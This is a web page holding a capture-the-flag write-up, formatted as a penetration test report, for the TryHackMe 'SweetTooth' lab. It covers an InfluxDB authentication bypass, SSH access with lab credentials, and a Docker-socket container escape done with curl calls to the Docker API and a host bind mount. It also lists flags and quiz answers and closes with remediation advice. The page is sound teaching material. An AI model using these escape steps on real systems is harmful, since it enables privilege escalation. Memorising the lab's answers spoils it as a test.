@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="The SweetTooth engagement targeted a host exposing InfluxDB 1.3.0. An authentication bypass (CVE-2019-20933) combined with a username leaked by the /debug/reque">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="SweetTooth Inc — Penetration Test Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>SweetTooth Inc — Penetration Test Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">SweetTooth Inc — Penetration Test Report</h1>
+<p class="writeup-meta"><span class="tag">TryHackMe</span> <span class="tag diff diff-medium">Medium</span> <span class="dot">·</span> <span class="date">2026-07-07</span></p>
+<div class="writeup-content">
+<p><strong>Target:</strong> 10.64.152.177 <strong>Date:</strong> 2026-07-07 <strong>Objective:</strong> Capture user.txt, container root.txt, and host root.txt</p>
+<hr>
+<p>The SweetTooth engagement targeted a host exposing InfluxDB 1.3.0. An authentication bypass (CVE-2019-20933) combined with a username leaked by the /debug/requests endpoint granted unauthenticated database queries. SSH credentials recovered from the creds database provided a foothold and the user flag. The Docker socket, world-writable and exposed via socat, allowed a container escape that mounted the host filesystem and recovered both root flags.</p>
+<hr>
+<h2>1. Reconnaissance</h2>
+<h3>Port Scan</h3>
+<pre><code>111/tcp   rpcbind
+2222/tcp  OpenSSH 6.7p1 Debian
+8086/tcp  InfluxDB http admin 1.3.0
+48630/tcp rpcbind (status)</code></pre>
+<h3>Key Finding</h3>
+<p>InfluxDB 1.3.0 is vulnerable to authentication bypass (CVE-2019-20933), allowing unauthenticated query access when a valid username is known.</p>
+<hr>
+<h2>2. Initial Access — InfluxDB CVE-2019-20933</h2>
+<h3>2.1 Username Discovery</h3>
+<p>The <code>/debug/requests</code> endpoint leaked an active username:</p>
+<pre><code>{&quot;o5yY6yya:127.0.0.1&quot;: {&quot;writes&quot;:2,&quot;queries&quot;:2}}</code></pre>
+<p><strong>InfluxDB User:</strong> <code>o5yY6yya</code></p>
+<h3>2.2 Authentication Bypass</h3>
+<p>InfluxDB < 1.7.6 accepts JWT tokens with an empty <code>SharedSecret</code>, allowing authentication as any known user. Used the public CVE-2019-20933 exploit to generate a valid token.</p>
+<h3>2.3 Database Enumeration</h3>
+<p>Enumerated all databases and extracted the SSH credentials from the <code>creds</code> database:</p>
+<pre><code>Database: creds → Table: ssh
+user: uzJk6Ry98d8C
+pw: 7788764472</code></pre>
+<p>Additional database queries:</p>
+<ul>
+<li><strong>tanks</strong> → <code>water_tank</code> temperature at timestamp 1621346400: <strong>22.5</strong></li>
+<li><strong>mixer</strong> → <code>mixer_stats</code> max motor_rpm: <strong>4875</strong></li>
+</ul>
+<hr>
+<h2>3. SSH Access</h2>
+<pre><code>$ ssh uzJk6Ry98d8C@10.64.152.177 -p 2222
+Password: 7788764472</code></pre>
+<h3>3.1 User Flag</h3>
+<pre><code>$ cat ~/user.txt
+THM{V4w4FhBmtp4RFDti}</code></pre>
+<hr>
+<h2>4. Privilege Escalation — Docker Escape</h2>
+<h3>4.1 Docker Socket Exposure</h3>
+<p>The Docker socket was world-writable and exposed via socat on localhost:8080:</p>
+<pre><code>srw-rw-rw- 1 root influxdb 0 Jul  7 20:08 /var/run/docker.sock</code></pre>
+<p>The <code>initializeandquery.sh</code> script ran:</p>
+<pre><code>socat TCP-LISTEN:8080,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock &amp;</code></pre>
+<h3>4.2 Container Escape</h3>
+<p>Created a new container with the host filesystem mounted at <code>/mnt</code>:</p>
+<pre><code>{
+  &quot;Image&quot;: &quot;sweettoothinc&quot;,
+  &quot;cmd&quot;: [&quot;/bin/bash&quot;],
+  &quot;Binds&quot;: [&quot;/:/mnt:rw&quot;]
+}</code></pre>
+<p>Created and started the container via the Docker API:</p>
+<pre><code>curl -X POST -H &quot;Content-Type: application/json&quot; -d @evil.json \
+  http://localhost:8080/containers/create
+curl -X POST http://localhost:8080/containers/&lt;CID&gt;/start</code></pre>
+<h3>4.3 Root Flags</h3>
+<p>Used the Docker exec API to read both root flags:</p>
+<p><strong>Container root.txt:</strong></p>
+<pre><code>THM{5qsDivHdCi2oabwp}</code></pre>
+<p><strong>Host root.txt:</strong></p>
+<pre><code>THM{nY2ZahyFABAmjrnx}</code></pre>
+<hr>
+<h2>5. Attack Chain Summary</h2>
+<table>
+<thead><tr>
+<th>Step</th>
+<th>Technique</th>
+<th>Result</th>
+</tr></thead><tbody>
+<tr>
+<td>1</td>
+<td>CVE-2019-20933 InfluxDB auth bypass</td>
+<td>Database access as <code>o5yY6yya</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>Query <code>creds</code> database</td>
+<td>SSH credentials: uzJk6Ry98d8C:7788764472</td>
+</tr>
+<tr>
+<td>3</td>
+<td>SSH over port 2222</td>
+<td>Container shell + user.txt</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Writeable Docker socket via socat</td>
+<td>Docker API on localhost:8080</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Create container with host bind mount</td>
+<td>Host filesystem in <code>/mnt</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>Docker exec API</td>
+<td>Container and host root.txt</td>
+</tr>
+</tbody></table>
+<h3>Flags</h3>
+<table>
+<thead><tr>
+<th>Flag</th>
+<th>Value</th>
+</tr></thead><tbody>
+<tr>
+<td>User</td>
+<td><code>THM{V4w4FhBmtp4RFDti}</code></td>
+</tr>
+<tr>
+<td>Root (container)</td>
+<td><code>THM{5qsDivHdCi2oabwp}</code></td>
+</tr>
+<tr>
+<td>Root (host)</td>
+<td><code>THM{nY2ZahyFABAmjrnx}</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2>6. Assessment Answers</h2>
+<table>
+<thead><tr>
+<th>Question</th>
+<th>Answer</th>
+</tr></thead><tbody>
+<tr>
+<td>Database software name</td>
+<td>InfluxDB</td>
+</tr>
+<tr>
+<td>Database user found</td>
+<td>o5yY6yya</td>
+</tr>
+<tr>
+<td>Water tank temp @ 1621346400</td>
+<td>22.5</td>
+</tr>
+<tr>
+<td>Max mixer motor RPM</td>
+<td>4875</td>
+</tr>
+<tr>
+<td>Username in database</td>
+<td>uzJk6Ry98d8C</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>7. Remediation Recommendations</h2>
+<ul>
+<li><strong>Upgrade InfluxDB:</strong> Version 1.3.0 is vulnerable to CVE-2019-20933. Update to 1.7.6+.</li>
+<li><strong>Restrict debug endpoints:</strong> <code>/debug/requests</code> leaks authenticated usernames.</li>
+<li><strong>Restrict Docker socket:</strong> Do not expose <code>/var/run/docker.sock</code> inside containers, even via socat.</li>
+<li><strong>Remove world-writable Docker socket:</strong> The socket should be owned by root:docker with 660 permissions.</li>
+<li><strong>Use different passwords:</strong> InfluxDB credentials and SSH credentials should not be hardcoded in scripts.</li>
+</ul>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
